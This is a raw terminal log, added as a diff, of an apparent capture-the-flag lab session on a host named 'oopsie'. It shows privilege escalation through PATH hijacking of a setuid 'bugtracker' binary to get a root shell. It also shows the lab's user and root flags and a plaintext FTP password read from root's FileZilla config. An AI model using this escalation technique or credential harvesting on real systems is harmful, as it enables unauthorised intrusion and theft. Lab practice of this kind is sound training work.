@@ -1,0 +1,268 @@
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Aug 16 19:31:57 UTC 2021
+
+  System load:  0.0                Processes:             127
+  Usage of /:   25.5% of 19.56GB   Users logged in:       0
+  Memory usage: 19%                IP address for ens160: 10.10.10.28
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat Jan 25 10:20:16 2020 from 172.16.118.129
+
+robert@oopsie:~$ ls
+user.txt
+robert@oopsie:~$ cat user.txt 
+f2c74ee8db7983851ab2a96a44eb7981
+robert@oopsie:~$ cd    ls -al
+total 36
+drwxr-xr-x 5 robert robert 4096 Feb 25  2020 .
+drwxr-xr-x 3 root   root   4096 Jan 23  2020 ..
+lrwxrwxrwx 1 robert robert    9 Jan 25  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
+drwx------ 2 robert robert 4096 Jan 23  2020 .cache
+drwx------ 3 robert robert 4096 Jan 23  2020 .gnupg
+drwxrwxr-x 3 robert robert 4096 Jan 25  2020 .local
+-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
+-rw-r--r-- 1 robert robert   33 Feb 25  2020 user.txt
+robert@oopsie:~$ cd ../../..
+robert@oopsie:/$ ls
+bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
+robert@oopsie:/$ cd 
+robert@oopsie:~$ id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+robert@oopsie:~$ find / -type f -group bugrtracker
+find: ‘/root’: Permission denied
+find: ‘/snap/core/7270/etc/chatscripts’: Permission denied
+find: ‘/snap/core/7270/etc/ppp/peers’: Permission denied
+find: ‘/snap/core/7270/etc/ssl/private’: Permission denied
+find: ‘/snap/core/7270/root’: Permission denied
+find: ‘/snap/core/7270/var/cache/ldconfig’: Permission denied
+find: ‘/snap/core/7270/var/lib/machines’: Permission denied
+find: ‘/snap/core/7270/var/lib/snapd/void’: Permission denied
+find: ‘/snap/core/7270/var/lib/waagent’: Permission denied
+find: ‘/snap/core/7270/var/spool/cron/crontabs’: Permission denied
+find: ‘/snap/core/7270/var/spool/rsyslog’: Permission denied
+find: ‘/snap/core/8268/etc/chatscripts’: Permission denied
+find: ‘/snap/core/8268/etc/ppp/peers’: Permission denied
+...
+...
+...
+/usr/bin/bugtracker
+robert@oopsie:~$ /usr/bin/bugtracker 
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1
+---------------
+
+Binary package hint: ev-engine-lib
+
+Version: 3.3.3-1
+
+Reproduce:
+When loading library in firmware it seems to be crashed
+
+What you expected to happen:
+Synchronized browsing to be enabled since it is enabled for that site.
+
+What happened instead:
+Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+
+robert@oopsie:~$ /usr/bin/bugtracker 
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 2
+---------------
+
+If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.
+
+ProblemType: Bug
+DistroRelease: Ubuntu 16.10
+Package: filezilla 3.15.0.2-1ubuntu1
+Uname: Linux 4.5.0-040500rc7-generic x86_64
+ApportVersion: 2.20.1-0ubuntu3
+Architecture: amd64
+CurrentDesktop: Unity
+Date: Sat May 7 16:58:57 2016
+EcryptfsInUse: Yes
+SourcePackage: filezilla
+UpgradeStatus: No upgrade log present (probably fresh install)
+
+robert@oopsie:~$ /usr/bin/bugtracker 
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 3
+---------------
+
+Hello,
+
+When transferring files from an FTP server (TLS or not) to an SMB share, Filezilla keeps freezing which leads down to very much slower transfers ...
+
+Looking at resources usage, the gvfs-smb process works hard (60% cpu usage on my I7)
+
+I don't have such an issue or any slowdown when using other apps over the same SMB shares.
+
+ProblemType: Bug
+DistroRelease: Ubuntu 12.04
+Package: filezilla 3.5.3-1ubuntu2
+ProcVersionSignature: Ubuntu 3.2.0-25.40-generic 3.2.18
+Uname: Linux 3.2.0-25-generic x86_64
+NonfreeKernelModules: nvidia
+ApportVersion: 2.0.1-0ubuntu8
+Architecture: amd64
+Date: Sun Jul 1 19:06:31 2012
+EcryptfsInUse: Yes
+InstallationMedia: Ubuntu 12.04 LTS "Precise Pangolin" - Alpha amd64 (20120316)
+ProcEnviron:
+ TERM=xterm
+ PATH=(custom, user)
+ LANG=fr_FR.UTF-8
+ SHELL=/bin/bash
+SourcePackage: filezilla
+UpgradeStatus: No upgrade log present (probably fresh install)
+---
+ApportVersion: 2.13.3-0ubuntu1
+Architecture: amd64
+DistroRelease: Ubuntu 14.04
+EcryptfsInUse: Yes
+InstallationDate: Installed on 2013-02-23 (395 days ago)
+InstallationMedia: Ubuntu 12.10 "Quantal Quetzal" - Release amd64 (20121017.5)
+Package: gvfs
+PackageArchitecture: amd64
+ProcEnviron:
+ LANGUAGE=fr_FR
+ TERM=xterm
+ PATH=(custom, no user)
+ LANG=fr_FR.UTF-8
+ SHELL=/bin/bash
+ProcVersionSignature: Ubuntu 3.13.0-19.40-generic 3.13.6
+Tags: trusty
+Uname: Linux 3.13.0-19-generic x86_64
+UpgradeStatus: Upgraded to trusty on 2014-03-25 (0 days ago)
+UserGroups:
+
+robert@oopsie:~$ /usr/bin/bugtracker 
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 4
+---------------
+
+cat: /root/reports/4: No such file or directory
+
+robert@oopsie:~$ export PATH = /tmp:$PATH
+robert@oopsie:~$ cd /tmp/
+robert@oopsie:/tmp$ ls
+systemd-private-1384da1dc571486ebe34c9f337f28e17-apache2.service-FLFJsg
+systemd-private-1384da1dc571486ebe34c9f337f28e17-systemd-resolved.service-3ldcUD
+systemd-private-1384da1dc571486ebe34c9f337f28e17-systemd-timesyncd.service-Fj89UB
+vmware-root_546-2999591749
+robert@oopsie:/tmp$ echo '/bin/sh' > cat
+robert@oopsie:/tmp$ chmod +x cat
+robert@oopsie:/tmp$ /usr/bin/bugtracker 
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1
+---------------
+
+# id
+uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+# ls
+cat
+systemd-private-1384da1dc571486ebe34c9f337f28e17-apache2.service-FLFJsg
+systemd-private-1384da1dc571486ebe34c9f337f28e17-systemd-resolved.service-3ldcUD
+systemd-private-1384da1dc571486ebe34c9f337f28e17-systemd-timesyncd.service-Fj89UB
+vmware-root_546-2999591749
+# cd 
+# ls
+user.txt
+# cd ..
+# cd ..
+# ls
+bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+cdrom  home  lib	     media	 proc  sbin  swap.img  usr  vmlinuz.old
+# cd root
+# ls
+reports  root.txt
+# more root.txt
+af13b0bee69f8a877c3faf667f7beacf
+# ls -al
+total 48
+drwx------  8 root root 4096 Mar 20  2020 .
+drwxr-xr-x 24 root root 4096 Jan 27  2020 ..
+lrwxrwxrwx  1 root root    9 Jan 25  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Jan 24  2020 .cache
+drwxr-xr-x  3 root root 4096 Jan 25  2020 .config
+drwx------  3 root root 4096 Jan 24  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Jan 23  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwxr-xr-x  2 root root 4096 Jan 24  2020 reports
+-rw-r--r--  1 root root   33 Feb 25  2020 root.txt
+drwx------  2 root root 4096 Jan 23  2020 .ssh
+-rw-------  1 root root 1325 Mar 20  2020 .viminfo
+# cd .config
+# ls -al
+total 12
+drwxr-xr-x 3 root root 4096 Jan 25  2020 .
+drwx------ 8 root root 4096 Mar 20  2020 ..
+drwxr-xr-x 2 root root 4096 Sep 11  2020 filezilla
+# cd filezilla
+# ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Sep 11  2020 .
+drwxr-xr-x 3 root root 4096 Jan 25  2020 ..
+-rw-r--r-- 1 root root  646 Sep 11  2020 filezilla.xml
+# more filezilla.xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<FileZilla3>
+    <RecentServers>
+        <Server>
+            <Host>10.10.10.46</Host>
+            <Port>21</Port>
+            <Protocol>0</Protocol>
+            <Type>0</Type>
+            <User>ftpuser</User>
+            <Pass>mc@F1l3ZilL4</Pass>
+            <Logontype>1</Logontype>
+            <TimezoneOffset>0</TimezoneOffset>
+            <PasvMode>MODE_DEFAULT</PasvMode>
+            <MaximumMultipleConnections>0</MaximumMultipleConnections>
+            <EncodingType>Auto</EncodingType>
+            <BypassProxy>0</BypassProxy>
+        </Server>
+    </RecentServers>
+</FileZilla3>
+# reboot
+Connection to 10.10.10.28 closed by remote host.
+Connection to 10.10.10.28 closed.
